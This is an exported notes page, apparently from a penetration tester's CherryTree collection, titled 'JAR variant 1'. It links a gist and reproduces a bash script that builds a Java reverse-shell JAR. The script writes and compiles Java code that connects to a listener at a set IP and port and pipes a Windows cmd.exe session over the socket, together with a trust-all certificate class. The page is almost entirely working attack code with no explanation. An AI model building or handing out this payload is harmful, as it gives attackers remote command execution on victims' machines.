<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>JAR variant 1</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">JAR variant 1</h1><br/><a href="https://gist.github.com/FrankSpierings/e330e3aea3152f816c202b883887dd60">https://gist.github.com/FrankSpierings/e330e3aea3152f816c202b883887dd60</a><br /><br /><br /><div class="codebox"><div class="codebox">#!/bin/bash<br />#&nbsp;This&nbsp;is&nbsp;not&nbsp;great...<br />#<br />NAME=connectback<br />TAC=TrustAllCertificates<br />LHOST=<span style="color:#ff0044;font-weight:400">192.168.119.142</span><br />LPORT=<span style="color:#ff0044;font-weight:400">6969</span><br />COMMAND='<span style="color:#3ad900;font-weight:400">"powershell"</span>'<br /><br />CURDIR=$(pwd)<br />BUILDDIR=$(mktemp&nbsp;-d)<br />cd&nbsp;<span style="color:#3ad900;font-weight:400">"${BUILDDIR}"</span><br /><br />cat&nbsp;&gt;&nbsp;<span style="color:#3ad900;font-weight:400">"${TAC}.java"</span>&nbsp;&lt;&lt;&nbsp;EOF<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.security.cert.CertificateException;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.security.cert.X509Certificate;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;javax.net.ssl.X509TrustManager;<br /><br /><span style="color:#7f0044;font-weight:400">public</span>&nbsp;<span style="color:#7f0044;font-weight:400">class</span>&nbsp;${TAC}&nbsp;<span style="color:#7f0044;font-weight:400">implements</span>&nbsp;X509TrustManager&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">public</span>&nbsp;<span style="color:#7f0044;font-weight:400">void</span>&nbsp;checkClientTrusted(X509Certificate[]&nbsp;certs,&nbsp;String&nbsp;authType)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">public</span>&nbsp;<span style="color:#7f0044;font-weight:400">void</span>&nbsp;checkServerTrusted(X509Certificate[]&nbsp;certs,&nbsp;String&nbsp;authType)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">public</span>&nbsp;X509Certificate[]&nbsp;getAcceptedIssuers()&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:700">null</span>;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br />EOF<br /><br />cat&nbsp;&gt;&nbsp;<span style="color:#3ad900;font-weight:400">"${NAME}.java"</span>&nbsp;&lt;&lt;&nbsp;EOF<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.net.*;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.io.*;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.io.OutputStream;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.io.InputStream;<br /><br /><span style="color:#7f0044;font-weight:400">public</span>&nbsp;<span style="color:#7f0044;font-weight:400">class</span>&nbsp;${NAME}&nbsp;{<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">public</span>&nbsp;<span style="color:#7f0044;font-weight:400">static</span>&nbsp;<span style="color:#7f0044;font-weight:400">void</span>&nbsp;main&nbsp;(String&nbsp;args[])&nbsp;<span style="color:#7f0044;font-weight:400">throws</span>&nbsp;Exception&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;c;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Socket&nbsp;s&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">new</span>&nbsp;Socket(<span style="color:#3ad900;font-weight:400">"${LHOST}"</span>&nbsp;,${LPORT});<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//Runtime&nbsp;r&nbsp;=&nbsp;Runtime.getRuntime();&nbsp;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;Process&nbsp;p&nbsp;=&nbsp;&nbsp;r.exec(new&nbsp;String[]&nbsp;{"C:/Windows/System32/cmd.exe",&nbsp;"/K",&nbsp;"Start"});</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process&nbsp;p&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">new</span>&nbsp;ProcessBuilder(<span style="color:#3ad900;font-weight:400">"C:/Windows/System32/cmd.exe"</span>).redirectErrorStream(<span style="color:#ff0044;font-weight:400">true</span>).start();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InputStream&nbsp;pin&nbsp;=&nbsp;p.getInputStream(),sin=s.getInputStream();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OutputStream&nbsp;pout&nbsp;=&nbsp;p.getOutputStream(),sout&nbsp;=s.getOutputStream();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>(!s.isClosed())<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>(&nbsp;pin.available()&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//int&nbsp;buff&nbsp;=&nbsp;in.read();</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sout.write(pin.read());<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>(&nbsp;sin.available()&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//int&nbsp;buff1&nbsp;=&nbsp;in1.read();</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pout.write(sin.read());<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pout.flush();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sout.flush();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">try</span>{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.exitValue();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">break</span>;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<span style="color:#ff9d00;font-weight:700">catch</span>&nbsp;(Exception&nbsp;e){}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;end&nbsp;while&nbsp;</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.destroy();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.close();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//end&nbsp;main</span><br />}<br />EOF<br />cat&nbsp;<span style="color:#3ad900;font-weight:400">"${TAC}.java"</span><br />cat&nbsp;<span style="color:#3ad900;font-weight:400">"${NAME}.java"</span><br />mkdir&nbsp;META-INF<br />echo&nbsp;<span style="color:#3ad900;font-weight:400">"Main-Class:&nbsp;${NAME}"</span>&nbsp;&gt;&nbsp;META-INF/MANIFEST.MF<br />javac&nbsp;--release&nbsp;<span style="color:#ff0044;font-weight:400">7</span>&nbsp;-d&nbsp;.&nbsp;*.java<br />jar&nbsp;cmvf&nbsp;META-INF/MANIFEST.MF&nbsp;shell.jar&nbsp;*.<span style="color:#7f0044;font-weight:400">class</span><br />mv&nbsp;shell.jar&nbsp;${CURDIR}/${NAME}.jar<br />cd&nbsp;${CURDIR}<br />rm&nbsp;-rf&nbsp;<span style="color:#3ad900;font-weight:400">"${BUILDDIR}"</span><br /></div></div></div></body></html>